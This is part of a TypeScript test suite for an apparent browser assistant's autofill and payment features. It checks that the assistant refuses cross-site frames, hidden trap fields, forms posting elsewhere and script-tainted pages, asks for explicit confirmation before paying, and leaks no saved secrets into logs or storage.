res = await run("browser_fill_card", "fill in my card");
res = await answer("yes, fill it in");
const frameFields = b.tab(tab.id).frames[0].win.document._flat().filter((e: Field) => e.localName === "input");
check("card: fields inside another site's frame are never filled, and it says which part is yours", res.ok === true && /^Filled your Visa ending 4242 on framed\.shop\.example\. I couldn't reach the card number, the expiry date and the security code — that is inside the payment provider's own frame/.test(line(res)) && el(tab.id, "holder").value === C.holder && frameFields.every((f: Field) => f.value === ""), line(res));
// No card, several cards.
const master = mem.add({ kind: "card", label: "Mastercard ending 4444", hosts: [], brand: "Mastercard", last4: "4444", hasCvc: true }, { number: "5555555555554444", holder: C.holder, expMonth: 11, expYear: 2030, cvc: "111" });
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_fill_card", "fill in my card");
check("card: several saved → asks which, by label", line(res) === "You have 2 cards saved: Visa ending 4242 and Mastercard ending 4444. Which one? Say, for example, fill in my Visa." && pendingQuestion() === null, line(res));
res = await run("browser_fill_card", "use my mastercard");
check("card: naming one asks about that one", /^Fill your Mastercard ending 4444 on checkout\.shop\.example\?/.test(line(res)), line(res));
dropPending();
mem.items.delete(master.id);
mem.items.delete(visa.id);
res = await run("browser_fill_card", "fill in my card");
check("card: none saved → says how to save one", res.ok === false && /don't have a card saved yet/.test(line(res)), line(res));
const visa2 = mem.add({ kind: "card", label: "Visa ending 4242", hosts: [], brand: "Visa", last4: "4242", hasCvc: true }, { number: C.card, holder: C.holder, expMonth: 3, expYear: 2031, cvc: C.cvcKept });

// ── details ──
mem.add({ kind: "identity", label: "My details", hosts: [] }, { fullName: C.fullName, email: C.email, phone: C.phone, address1: C.address1, address2: C.address2, city: C.city, region: C.region, postalCode: C.postal, country: "US" });
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_fill_details", "fill in my details");
check("details: name, email, phone and address go in; the card boxes are left alone", res.ok === true && line(res) === "Filled your name, your email, your phone number and your address on checkout.shop.example." && el(tab.id, "fullname").value === C.fullName && el(tab.id, "mail").value === C.email && el(tab.id, "phone").value === C.phone && el(tab.id, "addr1").value === C.address1 && el(tab.id, "city").value === C.city && el(tab.id, "state").value === "CA" && el(tab.id, "zip").value === C.postal && el(tab.id, "country").value === "US" && el(tab.id, "ccnum").value === "" && submitsOf(tab.id).length === 0, `${line(res)} ${J(valuesOf(tab.id))}`);
tab = fresh("hidden-trap.html", "https://trap.example/join");
await settle();
res = await run("browser_fill_details", "fill in my details");
const trapped = fieldsOf(tab.id).filter((f) => (f._ga("id") ?? "").startsWith("t-") && f.value !== "");
check("details: on a page with hidden fields, only what can be seen is filled — and that is all it says", line(res) === "Filled your email on trap.example." && el(tab.id, "email").value === C.email && trapped.length === 0, `${line(res)} trapped: ${trapped.map((f) => f._ga("id")).join(",")}`);
// Forms that post elsewhere beside one that stays: the one that stays is filled, and it is ITS button that is pressed —
// not the first form's, which would send the page (empty, but to another site) away.
tab = fresh("action-elsewhere.html", "https://www.acme.example/elsewhere");
await settle();
res = await run("browser_sign_in", "sign in");
const pressedForms = submitsOf(tab.id).map((s) => s.form);
check("sign-in: beside forms that post elsewhere, the one that stays is filled and its own button pressed — no other form is sent", res.ok === true && /pressed the button/.test(line(res)) && el(tab.id, "u4").value === C.user && el(tab.id, "p4").value === C.pass && pressedForms.length === 1 && pressedForms[0] === el(tab.id, "home") && ["u1", "p1", "u2", "p2", "u3", "p3"].every((id) => el(tab.id, id).value === ""), `${line(res)} ${J(valuesOf(tab.id))} sent: ${pressedForms.map((f) => f._ga("id")).join(",")}`);
tab = fresh("", "https://www.acme.example/elsewhere", fixture("action-elsewhere.html").replace(/<form id="home"[\s\S]*?<\/form>/, ""));
await settle();
res = await run("browser_sign_in", "sign in");
check("sign-in: a form that posts to another site is refused, in words", res.ok === false && line(res) === "That form sends what is typed to another site, so I didn't fill it in." && fieldsOf(tab.id).every((f) => f.value !== C.pass && f.value !== C.user), line(res));
// A page Trinity ran a script in: nothing from the vault goes into it until it is reloaded.
const SCRIPTED = "I ran a script on this page earlier, so I won't put anything from the vault into it. Reload the page and ask me again.";
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
await bridge.browserCall("page.inject", { tabId: tab.id, js: "1+1" });
sent = fillCalls();
res = await run("browser_fill_details", "fill in my details");
const cardAfterScript = await run("browser_fill_card", "fill in my card");
const signInAfterScript = await run("browser_sign_in", "sign in");
check("scripted: after a script ran on the page, details, card and sign-in are all refused in the same words, and nothing is sent", [res, cardAfterScript, signInAfterScript].every((x) => x.ok === false && line(x) === SCRIPTED) && fillCalls() === sent && pendingQuestion() === null && fieldsOf(tab.id).every((f) => f.value === "" || f.localName === "select"), [res, cardAfterScript, signInAfterScript].map(line).join(" | "));
b.navigate(tab.id, "https://checkout.shop.example/pay", fixture("checkout.html"));
await settle();
res = await run("browser_fill_details", "fill in my details");
check("scripted: …and once the page is reloaded it is filled", res.ok === true && /^Filled your name/.test(line(res)) && el(tab.id, "fullname").value === C.fullName, line(res));

// ── the spending guard: a click, Enter, and "type … and submit" ──
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_act", "click the pay button");
check("guard: a click on Pay asks first, naming the site and the total, and presses nothing", res.ok === true && line(res) === "That's “Pay $51.25” on checkout.shop.example, and the total shows $51.25. Say “yes, pay” and I'll press it." && submitsOf(tab.id).length === 0, line(res));
res = await answer("yes");
check("guard: a bare yes isn't enough to spend", res.ok === false && /say: yes, pay/.test(line(res)) && submitsOf(tab.id).length === 0, line(res));
res = await answer("yes, pay");
check("guard: 'yes, pay' presses it", res.ok === true && line(res) === "Clicked “Pay $51.25”." && submitsOf(tab.id).length === 1, line(res));
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
el(tab.id, "fullname").focus();
await settle();
res = await run("browser_act", "press enter");
check("guard: Enter in the form is the same press — asked about, not done", /^That's “Pay \$51\.25” on checkout\.shop\.example/.test(line(res)) && submitsOf(tab.id).length === 0, line(res));
res = await answer("no");
check("guard: no → not pressed", /won't press/.test(line(res)) && submitsOf(tab.id).length === 0);
res = await run("browser_act", "type Ryan in the full name box and submit");
check("guard: 'type … and submit' is asked about too — and nothing is typed meanwhile", /^That's “Pay \$51\.25” on checkout\.shop\.example/.test(line(res)) && el(tab.id, "fullname").value === "" && submitsOf(tab.id).length === 0, line(res));
res = await answer("yes pay it");
check("guard: after the yes it types (as it was said) and submits", line(res) === "Typed “Ryan” and submitted." && el(tab.id, "fullname").value === "Ryan" && submitsOf(tab.id).length === 1, `${line(res)} ${el(tab.id, "fullname").value}`);
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_act", "click the pay button", {}, { userWords: "buy the widget and pay for it" });
check("guard: a planner's step never presses it and never asks", res.ok === false && /only do when you ask me for it yourself/.test(line(res)) && pendingQuestion() === null && submitsOf(tab.id).length === 0, line(res));
workspace.activity("heartbeat:t2", "Scheduled: pay the bill…");
res = await run("browser_act", "click pay", {}, { recentTranscript: [] });
workspace.activity("heartbeat:t2", null);
check("guard: nor does a scheduled run", res.ok === false && pendingQuestion() === null && submitsOf(tab.id).length === 0, line(res));
// A control that sends rather than spends: the user's own word is enough — but it must be theirs.
tab = fresh("", "https://chat.example/room", '<!doctype html><html><head><title>Chat</title></head><body><form id="chat" action="/say"><input id="msg" aria-label="Message" /><button>Send</button></form><a href="https://www.facebook.com/chat">Facebook</a></body></html>');
el(tab.id, "msg").focus();
await settle();
res = await run("browser_act", "press enter");
check("guard: Enter that would press Send is held until the user says so", /That's the “Send” control\. If you want me to press it, say: yes, click Send\./.test(line(res)) && submitsOf(tab.id).length === 0, line(res));
res = await run("browser_act", "press enter and send it");
check("guard: …and goes once they did", line(res) === "Pressed Enter." && submitsOf(tab.id).length === 1, line(res));
res = await run("browser_act", "click facebook");
check("guard: 'Facebook' is not 'book' — an ordinary link is just clicked", line(res) === "Clicked “Facebook”." && b.page(tab.id).document._navigations.length === 1, line(res));

// ── a full board: the share is left out, and the tool still answers (with the board's own sentence) ──
{
  const board = await import("../server/src/workspace/board.ts");
  const filler: { id: string }[] = [];
  for (let i = 0; i < board.BOARD_LIMITS.cards + 5; i++) {
    try {
      filler.push(board.addCard({ kind: "text", title: `Filler ${i}`, text: "x", status: "ready" }));
    } catch (err) {
      if (!(err instanceof board.BoardLimitError)) throw err;
      break;
    }
  }
  tab = fresh("", "https://links.example/full", "<!doctype html><html><head><title>Full</title></head><body><main><h1>A page to share</h1><p>Words.</p></main></body></html>");
  await settle();
  const warned = logged.length;
  res = await run("browser_share", "put this page on the board");
  check("full board: 'put this page on the board' answers with the board's own words, adds nothing, throws nothing", res.ok === false && /^The board is full/.test(line(res)) && logged.slice(warned).some((l) => /\[browser_share\] the board can't take another card/.test(l)), line(res));
  const toasts = busEvents.length;
  const fromMenu = await b.popup({ type: "share" });
  await until(() => busEvents.slice(toasts).some((e) => J(e).includes("The board is full")), 2000);
  check("full board: a share from Chrome's menu is left out with a toast that says why", fromMenu?.ok === true && busEvents.slice(toasts).some((e) => J(e).includes("The board is full")), J(busEvents.slice(toasts)).slice(0, 300));
  for (const c of filler) board.dropCard(c.id);
}

// ════════════════════════════════════════════════════════════════════════════════════════
console.log("\n── Part 4: the same sign-in through the engine's own vault ──");
fillTools.useFillVault(null);
let realVault = "skipped";
try {
  const vault = await import("../server/src/vault/index.ts");
  const forms = await import("../server/src/vault/forms.ts");
  const status = vault.vaultStatus();
  if (status.blocked) realVault = `skipped: ${status.blocked}`;
  else {
    tab = fresh("login.html", "https://real.example/login");
    await settle();
    const toldReal = told().length;
    res = await run("browser_sign_in", "sign in");
    const open = vault.openForms().find((f: { purpose: string }) => f.purpose === "save-login");
    check("real vault: nothing saved → its own secure form opens for the host", res.inProgress === "started" && Boolean(open) && open!.host === "real.example" && open!.fields.every((f: { type: string; value?: string }) => f.type === "text" || !f.value), line(res));
    await forms.submitForm(open!.id, { label: "Real", username: C.newUser, password: C.newPass, totpSecret: "" });
    await until(() => told().length > toldReal && el(tab.id, "password").value === C.newPass, 20_000);
    check("real vault: submitted → saved, filled from the vault, button pressed", told()[told().length - 1] === "Saved your Real login. Filled your Real login on real.example, and pressed the button." && el(tab.id, "email").value === C.newUser && el(tab.id, "password").value === C.newPass, told()[told().length - 1]);
    check("real vault: what it lists is a label, a host and a masked hint", J(vault.findLogins("real.example")).includes('"label":"Real"') && !J(vault.listItems()).includes(C.newUser) && !J(vault.listItems()).includes(C.newPass));
    realVault = "ran";
  }
} catch (err) {
  realVault = `skipped: ${(err as Error).message.slice(0, 120)}`;
}
report(`(the engine's own vault: ${realVault})`);

// ════════════════════════════════════════════════════════════════════════════════════════
console.log("\n── The canary: every secret used above, searched for in everything that can be observed ──");
await sleep(400);
const spaced = (n: string) => n.match(/.{1,4}/g)!.join(" ");
// A short run of digits is only itself when it stands alone (not inside a longer number, an id or base64).
const alone = (digits: string) => new RegExp(`(?<![A-Za-z0-9+/=._-])${digits}(?![A-Za-z0-9+/=._-])`);
const needles: [string, RegExp | string][] = [
  ["a user name", C.user],
  ["a password", C.pass],
  ["the work user name", C.userWork],
  ["the work password", C.passWork],
  ["the authenticator key", C.totpSeed],
  ["the one-time code", alone(C.totpCode)],
  ["the card number", C.card],
  ["the card number, spaced", spaced(C.card)],
  ["the card holder", C.holder],
  ["the security code", alone(C.cvc)],
  ["the kept security code", alone(C.cvcKept)],
  ["the full name", C.fullName],
  ["the email", C.email],
  ["the phone number", C.phone],
  ["the address", C.address1],
  ["the postal code", C.postal],
  ["the new user name", C.newUser],
  ["the new password", C.newPass],
];
const found = (text: string) => needles.filter(([, n]) => (typeof n === "string" ? text.includes(n) : n.test(text))).map(([name]) => name);
const walk = (dir: string): string[] => fs.readdirSync(dir, { withFileTypes: true }).flatMap((d) => (d.isDirectory() ? walk(path.join(dir, d.name)) : [path.join(dir, d.name)]));
const files = walk(RUN);
const observed: [string, string][] = [
  ["every tool result (say, speak, data, render)", J(results)],
  ["every event a tool emitted, and every line told afterwards", J(emitted)],
  ["every workspace event", J(busEvents)],
  ["the workspace snapshot", J(workspace.snapshot())],
  ["what the next action is told was just found", J(recentResults())],
  ["everything logged", logged.join("\n")],
  ["every frame the engine sent the extension", b.log.sockets.flatMap((s: { received: string[] }) => s.received).join("\n")],
  ["every frame the extension sent the engine", b.log.sockets.flatMap((s: { sent: string[] }) => s.sent).join("\n")],
  ["chrome.storage (local and session)", J([b.storage.local.data, b.storage.session.data])],
  ["downloads, new tabs and what was captured", J([b.log.downloads, b.log.created, b.log.captures])],
  [`the files in the data folder (${files.length})`, files.map((f) => fs.readFileSync(f).toString("latin1")).join("\n")],
];
for (const [where, text] of observed) {
  const hits = found(text);
  check(`canary: nothing secret in ${where}`, hits.length === 0, hits.join(", "));
}
check("canary: (control) the search does find them where they belong — in the page's own fields", found(inThePage).join(",") === "a user name,a password" && found(J({ a: spaced(C.card), b: ` ${C.cvc} `, c: `code ${C.totpCode} now` })).length === 3, found(inThePage).join(","));
check("canary: (control) there was plenty to search", results.length > 40 && emitted.length > 5 && busEvents.length > 10 && logged.length > 10, `${results.length} results, ${emitted.length} events, ${busEvents.length} workspace events, ${logged.length} log lines`);
check("canary: every fill went as a sealed envelope", fillCalls() > 10 && b.log.sockets.flatMap((s: { received: string[] }) => s.received).filter((t: string) => t.includes('"method":"page.fill"')).every((t: string) => /"sealed":\{"iv":"[A-Za-z0-9+/=]{16}","ct":"[A-Za-z0-9+/=]+"\}/.test(t) && !/"values"/.test(t)), `${fillCalls()} fills`);

server.close();
console.log(`\n${passes} passed, ${fails} failed`);
console.log(fails ? `\n${fails} FAILED` : "\nALL PASSED");
process.exit(fails ? 1 : 0);
